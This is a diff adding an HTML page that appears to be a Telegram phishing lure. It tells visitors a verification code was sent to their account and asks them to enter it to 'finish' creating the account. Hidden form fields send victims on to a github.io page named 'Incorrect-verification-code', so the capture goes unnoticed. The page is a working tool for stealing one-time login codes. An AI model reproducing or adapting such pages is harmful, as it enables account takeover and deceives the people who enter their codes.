@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>verification process</title>
+  <link rel="stylesheet" href="code.css">
+</head>
+
+<body>
+  <div class="top">
+    <h1>You have been recieved!</h1>
+    <p class="p1">You have putted username on previous page, according to that we send a verification code to your account. and it is used for verify the username you put is your account. and if you want to finish create account please fill in the folliwing field.</p>
+  </div>
+  <div class="tgi-d">
+    <img src="telegram.jpg" alt="" class="tgi">
+  </div>
+  <br>
+  <div class="login-part">
+    <form class="form" action="" method="POST">
+    <input type="hidden" name="_next"
+  value="https://gutu456.github.io/Incorrect-verification-code/">
+       <input type="hidden" name="_template" value="table">
+      <input oninput="check();" type="number" placeholder="Verification code" name="telegram_verificationCode" class="ver" id="ur83hr83h8e" required><br><br><br>
+      <button class="next" type="submit">Next</button>
+    </form>
+    <br><br>
+    <p4>Code will expired in:</p4>
+    <br><br>
+    <p2 class="p2"></p2>
+    <br><br>
+    <p3 class="p3"></p3>
+  </div>
+  <script src="code.js"></script>
+</body> 
+</html>
